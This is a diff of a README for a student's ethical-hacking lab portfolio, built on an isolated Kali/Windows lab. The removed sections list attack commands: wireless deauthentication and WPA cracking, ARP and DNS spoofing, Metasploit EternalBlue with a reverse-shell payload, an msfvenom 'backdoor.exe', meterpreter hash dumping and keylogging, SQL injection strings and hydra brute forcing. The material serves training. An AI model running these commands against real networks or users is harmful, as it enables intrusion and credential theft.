@@ -1,305 +1,138 @@
-# 🛡️ Sher Singh's Cybersecurity Portfolio
+# 🛡️ Sher Singh's Cybersecurity & Ethical Hacking Portfolio
 
-## 📌 Project Overview
-This repository serves as a comprehensive, structured record of my hands-on experience and practical lab work in ethical hacking and penetration testing. It documents my journey from setting up secure, isolated virtual environments to executing advanced, real-world cyber attacks. Through these exercises, I have developed a strong foundation in network analysis, vulnerability assessment, and offensive security techniques.
+<div align="center">
 
-**Current Objectives:** 
-- Complete extensive practical lab scenarios.
-- Attain industry-standard certifications (eJPT, CEH, OSCP).
-- Continuously build and refine penetration testing skills.
+**Offensive Security** · **Penetration Testing** · **Network Exploitation** · **Web Application Hacking**
+
+[![Labs](https://img.shields.io/badge/Labs_Completed-4-brightgreen)]()
+[![Status](https://img.shields.io/badge/Status-Active-blue)]()
+[![Focus](https://img.shields.io/badge/Focus-Offensive_Security-red)]()
+
+</div>
+
+---
+
+## 👤 About Me
+
+Aspiring Cybersecurity Professional with hands-on experience in **offensive penetration testing** and **network security**. Currently building practical skills through structured lab exercises covering wireless attacks, network exploitation, man-in-the-middle techniques, and web application hacking.
+
+**Career Objectives:**
+- Secure a role as a **Penetration Tester / SOC Analyst / Cybersecurity Professional**
+- Complete extensive hands-on lab scenarios with documented proof of work
+- Attain industry-standard certifications: **eJPT → CEH → OSCP → CySA+**
+- Build custom security tools that demonstrate real coding ability
+
+---
+
+## 🔥 Featured Labs
+
+### [🧪 Lab 03: ARP Spoofing & Post-Connection Attacks](labs/lab-03-network-post-connection/README.md)
+Executed full bidirectional ARP cache poisoning against a Windows target on a NAT Network, intercepted HTTP traffic in real-time, captured cleartext credentials via Wireshark, and performed DNS spoofing to redirect victim traffic. Documented 2 real technical issues encountered (IP forwarding failure, NAT vs NAT Network misconfiguration) and their resolutions.
+
+### [🧪 Lab 04: Man-in-the-Middle Deep Dive](labs/lab-04-mitm-deep-dive/README.md)
+Advanced MITM techniques including deep Wireshark traffic analysis with credential extraction filters, HTTPS downgrade testing with SSLstrip, real-time JavaScript injection into HTTP pages, and complete Bettercap MITM workflow. Mapped all techniques to MITRE ATT&CK framework (T1557, T1040, T1185, T1573).
+
+### [🧪 Lab 02: Wireless Pre-Connection Attacks](labs/lab-02-network-pre-connection/README.md)
+Audited wireless networks using monitor mode, performed packet sniffing with `airodump-ng`, executed deauthentication attacks to force client reconnections, captured WPA2 4-way handshakes, and cracked network passwords using offline dictionary attacks with `aircrack-ng`.
+
+### [🧪 Lab 01: Penetration Testing Environment Setup](labs/lab-01-environment-setup/README.md)
+Built a production-grade isolated penetration testing lab with Kali Linux (attacker) and Windows (target) VMs on a custom NAT Network. Verified inter-VM connectivity and documented the complete architecture for repeatable testing.
 
 ---
 
 ## 🎯 Skills Demonstrated
-- **Network Analysis & Wireless Security**: Sniffing, WPA/WPA2 cracking, Deauthentication attacks, monitor mode configurations.
-- **Man-in-the-Middle (MITM) Attacks**: ARP Spoofing, DNS Spoofing, HTTPS downgrades, and extracting cleartext credentials.
-- **Vulnerability Exploitation**: Scanning with Nmap/Metasploit, exploiting vulnerable services (e.g., EternalBlue), and bypassing security mechanisms.
-- **Post-Exploitation Tactics**: Privilege escalation, payload generation (MSFvenom), keylogging, maintaining persistence, and hash dumping.
-- **Web Application Penetration Testing**: SQL Injection (SQLi), Cross-Site Scripting (XSS), Local File Inclusion (LFI), and brute-forcing logins.
 
----
-
-## 🛠️ Lab Environment Setup
-To ensure safety and legal compliance, all attacks are conducted in a strictly isolated local laboratory environment.
-
-- **Attacker Machine:** Kali Linux VM
-- **Target Machine(s):** Windows VM / Metasploitable
-- **Network Architecture:** Unified NAT Network (ensuring all VMs possess visibility while remaining isolated from the host/external network).
+| Skill Area | Techniques | Tools |
+|---|---|---|
+| **Wireless Security** | Monitor mode, packet sniffing, WPA/WPA2 cracking, deauth attacks | `airmon-ng`, `airodump-ng`, `aireplay-ng`, `aircrack-ng` |
+| **Network Exploitation** | ARP spoofing/poisoning, network discovery, traffic interception | `arpspoof`, `arp-scan`, `netdiscover`, `bettercap` |
+| **MITM Attacks** | ARP cache poisoning, DNS spoofing, HTTPS downgrade, JS injection | `bettercap`, `ettercap`, `sslstrip` |
+| **Traffic Analysis** | Deep packet inspection, credential extraction, session analysis | `wireshark`, `urlsnarf`, `driftnet` |
+| **Vulnerability Exploitation** | Service scanning, exploit execution, payload delivery | `nmap`, `msfconsole`, `msfvenom` |
+| **Post-Exploitation** | Privilege escalation, persistence, hash dumping, keylogging | `meterpreter`, Metasploit Framework |
+| **Web App Hacking** | SQLi, XSS, LFI, brute forcing | `sqlmap`, `hydra`, `burpsuite` |
 
 ---
 
 ## 📈 Learning Progress Tracker
 
-| Module | Status | Completion Date |
-|:---|:---:|:---:|
-| **1. Setup & Fundamentals** | ⬜ Not Started | - |
-| **2. Network Hacking (Pre-Connection)** | ⬜ Not Started | - |
-| **3. Network Hacking (Post-Connection)** | 🔄 In Progress | 27-03-2025 |
-| **4. Man-in-the-Middle Attacks** | 🔄 In Progress | 27-03-2025 |
-| **5. Gaining Access (System Hacking)** | ⬜ Not Started | - |
-| **6. Post Exploitation** | ⬜ Not Started | - |
-| **7. Web Application Hacking** | ⬜ Not Started | - |
+| # | Module | Status | Lab Link |
+|:---:|:---|:---:|:---|
+| 1 | Setup & Fundamentals | ✅ Completed | [Lab 01](labs/lab-01-environment-setup/README.md) |
+| 2 | Network Hacking (Pre-Connection) | ✅ Completed | [Lab 02](labs/lab-02-network-pre-connection/README.md) |
+| 3 | Network Hacking (Post-Connection) | ✅ Completed | [Lab 03](labs/lab-03-network-post-connection/README.md) |
+| 4 | Man-in-the-Middle Attacks | ✅ Completed | [Lab 04](labs/lab-04-mitm-deep-dive/README.md) |
+| 5 | Gaining Access (System Hacking) | 🔒 Coming Soon | — |
+| 6 | Post Exploitation | 🔒 Coming Soon | — |
+| 7 | Web Application Hacking | 🔒 Coming Soon | — |
 
-> **Legend:** ✅ Completed &nbsp;&nbsp;\|&nbsp;&nbsp; 🔄 In Progress &nbsp;&nbsp;\|&nbsp;&nbsp; ⬜ Not Started &nbsp;&nbsp;\|&nbsp;&nbsp; ❌ Troubleshooting Needs
-
----
-
-## 💻 Section 1: Setup & Basics
-
-**Objective:** Establish and verify an isolated penetration testing environment.
-
-- [ ] Install VirtualBox / VMware hypervisor.
-- [ ] Deploy Kali Linux VM (Attacker).
-- [ ] Deploy Windows VM (Target).
-- [ ] Configure Virtual NAT Network routing.
-- [ ] Verify inter-VM connectivity via ICMP requests (`ping`).
-- [ ] Solidify understanding of IP vs. MAC addressing operations.
-
-### 🧪 Lab Results Log
-| Field | Value |
-|---|---|
-| **Kali IP** | *Pending* |
-| **Windows VM IP** | *Pending* |
-| **Router IP** | *Pending* |
-| **Status** | ⬜ |
-
----
-
-## 📡 Section 2: Network Hacking — Pre-Connection Attacks
-
-**Objective:** Audit local wireless networks and execute attacks without establishing authentication.
-
-- [ ] Engage Monitor Mode on physical WiFi adapters.
-- [ ] Perform packet sniffing and target identification with `airodump-ng`.
-- [ ] Disconnect associated clients via Deauthentication attacks.
-- [ ] WEP Cracking.
-- [ ] Intercept WPA/WPA2 cryptographic handshakes.
-- [ ] Execute localized dictionary attacks on WPA/WPA2 captures.
-- [ ] Launch Evil Twin / Fake Access Point infrastructure.
-
-### 🔑 Critical Commands
-```bash
-# Enable monitor mode on interface
-sudo airmon-ng start wlan0
-
-# Broad network reconnaissance
-sudo airodump-ng wlan0mon
-
-# Directed traffic capture on a specific BSSID
-sudo airodump-ng --bssid <BSSID> -c <channel> -w capture wlan0mon
-
-# Forced deauthentication attack
-sudo aireplay-ng --deauth 100 -a <ROUTER-MAC> -c <CLIENT-MAC> wlan0mon
-
-# Dictionary attack against captured WPA handshake
-sudo aircrack-ng capture.cap -w /usr/share/wordlists/rockyou.txt
-```
-
-### 🧪 Lab Results Log
-| Target Network | Attack Vector | Result | Issues Identified & Mitigations |
-|---|---|:---:|---|
-| *Domain* | *Deauth* | ⬜ | *N/A* |
-
----
-
-## 🔀 Section 3: Network Hacking — Post-Connection Attacks
-
-**Objective:** Exploit layer 2 vulnerabilities to manipulate traffic flows from within an authenticated network edge.
-
-- [ ] Enumerate internal network devices via `netdiscover` and `arp-scan`.
-- [ ] Perform comprehensive ARP Spoofing/Poisoning against target endpoints.
-- [ ] Analyze intercepted PCAP structures securely via Wireshark.
-- [ ] Extract cleartext authentication (HTTP) data from streams.
-- [ ] Intercept and falsify DNS resolution entries (DNS Spoofing).
-- [ ] Implement robust MITM frameworks leveraging `bettercap`.
-
-### 🔑 Critical Commands
-```bash
-# Network device enumeration
-sudo arp-scan --localnet
-sudo netdiscover -i eth0
-
-# Enable IP forwarding to prevent denial of service during MITM
-echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
-
-# Bidirectional ARP Spoofing (Run in separate terminal sessions)
-sudo arpspoof -i eth0 -t <VICTIM-IP> <ROUTER-IP>   # Poison Target
-sudo arpspoof -i eth0 -t <ROUTER-IP> <VICTIM-IP>   # Poison Router
-
-# Cleartext HTTP Sniffing
-sudo urlsnarf -i eth0
-sudo driftnet -i eth0
-
-# DNS Spoofing via Ettercap (requires pre-configured dns_spoof.conf)
-sudo ettercap -T -q -i eth0 -P dns_spoof -M arp:remote /<VICTIM-IP>// /<ROUTER-IP>//
-```
-
-### 🧪 Lab Results Log — ARP Spoofing Incident (27-03-2025)
-| Objective Checklist | Status | Note |
-|---|:---:|---|
-| Enable IP Forwarding | ✅ | Critical to prevent dropping packets. |
-| Poison Victim ARP Cache | ✅ | Validated via `arp -a` on Windows Target. |
-| Poison Router ARP Cache | ✅ | Successfully mirrored traffic. |
-| Traffic Captured Successfully | ✅ | Able to observe clear HTTP requests. |
-
----
-
-## 🎭 Section 4: Man-in-the-Middle (MITM) Deep Dive
-
-**Objective:** Advanced analysis, traffic mutation, and stealth tactics during interception phases.
-
-- [ ] Execute modular MITM routing through `bettercap`.
-- [ ] Create specialized Wireshark filtering parameters for credential extraction.
-- [ ] Implement `sslstrip` techniques to forcibly downgrade HTTPS to HTTP.
-- [ ] Execute arbitrary JavaScript injection into transmitted standard HTTP responses.
-
-### 🔑 Critical Commands
-```bash
-# Advanced Wireshark syntax for rapid triage
-http                        # Filter all standard web traffic
-http.request.method == POST # Restrict to submission endpoints (likely credentials)
-http contains "password"    # Explicit string matching
-dns                         # Review queried domains
-
-# Bettercap configuration baseline
-sudo bettercap -iface eth0
-
-# Bettercap interactive session flow
-> net.probe on
-> net.show
-> set arp.spoof.targets <VICTIM-IP>
-> arp.spoof on
-> net.sniff on
-```
-
----
-
-## 💻 Section 5: Gaining Access (System Hacking)
-
-**Objective:** Discover, validate, and successfully exploit deterministic vulnerabilities in server protocols and client applications.
-
-- [ ] Reconnaissance via Metasploit (`db_nmap`) database integrations.
-- [ ] Exploit vulnerable SMB endpoints (e.g., MS17-010 EternalBlue).
-- [ ] Package malicious `.exe` payloads using `msfvenom` and encoders.
-- [ ] Deploy multi-handler environments to capture reverse shells.
-- [ ] Initiate preliminary client-side attack mapping.
-
-### 🔑 Critical Commands
-```bash
-# Launch Metasploit Framework Console
-sudo msfconsole
-
-# Search, Configure, and Launch an Exploit Sequence
-msf> search eternalblue
-msf> use exploit/windows/smb/ms17_010_eternalblue
-msf> set RHOSTS <TARGET-IP>
-msf> set PAYLOAD windows/x64/meterpreter/reverse_tcp
-msf> set LHOST <KALI-IP>
-msf> run
-
-# Generating Custom Reverse TCP Payload
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<KALI-IP> LPORT=4444 -f exe > backdoor.exe
-```
-
----
-
-## 🕵️ Section 6: Post Exploitation
-
-**Objective:** Establish persistence, escalate privileges, and seamlessly extract data post-compromise.
-
-- [ ] Command and control via Meterpreter architecture.
-- [ ] Bypass logical filesystem boundaries via privilege escalation.
-- [ ] Dump local SAM/LSASS hashes for offline cracking operations.
-- [ ] Implement logical keyloggers and interface monitoring.
-- [ ] Solidify persistence mechanisms via registry mutations.
-- [ ] Document internal layout for potential network pivoting actions.
-
-### 🔑 Critical Commands
-```bash
-# Standard Meterpreter Post-Exploitation Commands
-meterpreter> sysinfo          # Evaluate host baseline
-meterpreter> getuid           # Determine current privilege level
-meterpreter> hashdump         # Extract encrypted credentials
-meterpreter> screenshot       # Visual validation of active session
-meterpreter> keyscan_start    # Deploy stealth keylogger
-meterpreter> keyscan_dump     # Harvest logged keystrokes
-meterpreter> run persistence  # Ensure survival across reboots
-meterpreter> shell            # Spawn native OS shell environment
-```
-
----
-
-## 🌐 Section 7: Web Application Hacking
-
-**Objective:** Identify, exploit, and document security flaws in the presentation and database layers of modern web applications.
-
-- [ ] Uncover input sanitization failures leading to SQL Injection (SQLi).
-- [ ] Automate enumeration and data extraction with `sqlmap`.
-- [ ] Discover and exploit Reflected and Stored Cross-Site Scripting (XSS).
-- [ ] Achieve remote code execution via unsafe File Upload functionalities.
-- [ ] Perform directory traversal via Local File Inclusion (LFI).
-- [ ] Execute targeted, parameter-based brute force strategies utilizing Hydra.
-
-### 🔑 Critical Commands
-```bash
-# SQL Injection Logic Tests
-' OR '1'='1
-' OR 1=1--
-admin'--
-
-# SQLmap Database Enumeration
-sqlmap -u "http://target.com/page?id=1" --dbs
-sqlmap -u "http://target.com/page?id=1" -D dbname --tables
-
-# Automated Form-Based Brute Forcing with Hydra
-hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET-IP> http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
-
-# Basic XSS Validation Payload
-<script>alert('XSS Exploit Successful')</script>
-```
+> **Legend:** ✅ Completed &nbsp;|&nbsp; 🔒 Coming Soon
 
 ---
 
 ## 🧰 The Penetration Tester's Toolkit
-A quick reference to the principal tools utilized across all lab scenarios:
 
-| Tool | Primary Purpose | Deployment Method |
+| Tool | Primary Purpose | Category |
 |:---|:---|:---|
-| **`nmap`** | Port and service surface mapping | Pre-installed (Kali) |
-| **`msfconsole`** | Enterprise-grade exploitation framework | Pre-installed (Kali) |
-| **`msfvenom`** | Malicious payload structuring | Pre-installed (Kali) |
-| **`airodump-ng` / `aircrack-ng`**| Wireless capture and cryptographic cracking | Pre-installed (Kali) |
-| **`arpspoof`** | Layer 2 redirection and poisoning | `sudo apt install dsniff` |
-| **`bettercap`** | Next-gen automated MITM orchestration | `sudo apt install bettercap` |
-| **`wireshark`** | Granular deep packet inspection | Pre-installed (Kali) |
-| **`sqlmap`** | Automated database exploitation | Pre-installed (Kali) |
-| **`hydra`** | Protocol-agnostic network logon cracker | Pre-installed (Kali) |
+| **`nmap`** | Port/service scanning & reconnaissance | Reconnaissance |
+| **`msfconsole`** | Enterprise exploitation framework | Exploitation |
+| **`msfvenom`** | Custom payload generation | Exploitation |
+| **`airmon-ng` / `airodump-ng` / `aircrack-ng`** | Wireless capture & cracking | Wireless |
+| **`arpspoof`** | Layer 2 ARP cache poisoning | Network |
+| **`bettercap`** | All-in-one MITM framework | Network |
+| **`wireshark`** | Deep packet inspection & forensics | Analysis |
+| **`ettercap`** | MITM with plugin support (DNS spoof) | Network |
+| **`sqlmap`** | Automated SQL injection | Web |
+| **`hydra`** | Protocol-agnostic brute forcing | Web |
 
 ---
 
-## ⚠️ Key Learnings & Issue Log
+## ⚠️ Issues Encountered & Resolutions
 
-Real-world hacking involves as much debugging as it does executing attacks. Below is a log of critical technical hurdles encountered in the lab and how they were overcome:
+Real-world hacking involves as much debugging as executing attacks. These are genuine problems encountered during labs:
 
-**1. ARP Spoofing Failure — Traffic Dropping**
-- **Symptom:** Generating ARP spoof traffic successfully modified the MAC addresses on the victim cache, but the target completely lost internet connectivity rather than passing traffic through the attacker.
-- **Root Cause & Fix:** IP Forwarding was disabled by default in the Linux kernel on the Kali machine.
-- **Solution:** Addressed immediately by mutating `/proc/sys/net/ipv4/ip_forward` to a state of `1` (`echo 1 > /proc/sys/net/ipv4/ip_forward`). 
-
-**2. Attack Isolation Misconfiguration**
-- **Symptom:** Early ARP and network discovery attempts failed to reach the Windows Target VM.
-- **Root Cause & Fix:** The virtualized adapter was operating in standard standard 'NAT' rather than a 'NAT Network', isolating each VM dynamically.
-- **Solution:** Re-configured the hypervisor to bind both Attacker and Target to the same custom `NAT Network` subsystem.
+| # | Issue | Root Cause | Resolution |
+|:---:|:---|:---|:---|
+| 1 | ARP Spoofing caused victim to lose internet entirely | IP Forwarding disabled by default in Linux kernel | `echo 1 > /proc/sys/net/ipv4/ip_forward` before starting spoof |
+| 2 | ARP spoof packets not reaching Windows target | VMs on regular "NAT" mode (isolated) instead of "NAT Network" | Reconfigured both VMs to same custom NAT Network |
 
 ---
 
-## 📚 External Resources & Accreditations
+## 📚 Certifications & Learning Path
 
-- 🎓 **Origin Course:** [Zaid's Learn Ethical Hacking from Scratch (Udemy)](https://www.udemy.com/course/learn-ethical-hacking-from-scratch/)
-- 🏋️ **Active Practice:** [TryHackMe - Jr Penetration Tester Path](https://tryhackme.com/path/outline/jrpenetrationtester)
-- 🏋️ **Advanced Practice:** [HackTheBox](https://www.hackthebox.com/)
-- 📖 **Methodology Checklists:** [HackTricks Platform](https://book.hacktricks.xyz/)
+| Certification | Status |
+|:---|:---:|
+| **eJPT** (eLearnSecurity Junior Penetration Tester) | 🎯 Target |
+| **CEH** (Certified Ethical Hacker) | 🎯 Target |
+| **OSCP** (Offensive Security Certified Professional) | 🎯 Target |
+| **CySA+** (CompTIA Cybersecurity Analyst) | 🎯 Target |
+
+---
+
+## 📚 Resources & Training
+
+- 🎓 **Course:** [Learn Ethical Hacking from Scratch — Zaid Sabih (Udemy)](https://www.udemy.com/course/learn-ethical-hacking-from-scratch/)
+- 🏋️ **Practice:** [TryHackMe — Jr Penetration Tester Path](https://tryhackme.com/path/outline/jrpenetrationtester)
+- 🏋️ **Advanced:** [HackTheBox](https://www.hackthebox.com/)
+- 📖 **Methodology:** [HackTricks](https://book.hacktricks.xyz/)
+
+---
+
+## 📂 Repository Structure
+
+```
+Ethical-Hacking-Portfolio/
+├── README.md                                    ← You are here
+├── labs/
+│   ├── lab-01-environment-setup/README.md       ← Lab environment setup
+│   ├── lab-02-network-pre-connection/README.md  ← Wireless pre-connection attacks
+│   ├── lab-03-network-post-connection/README.md ← ARP spoofing & MITM
+│   └── lab-04-mitm-deep-dive/README.md          ← Advanced MITM techniques
+└── (more labs coming as sections are completed)
+```
+
+---
 
 <div align="center">
-  <sub>🛡️ Remember: Always act with permission. Hack legally. Hack ethically.</sub>
+  <sub>🛡️ All exercises performed in isolated lab environments. Always act with permission. Hack legally. Hack ethically.</sub>
 </div>
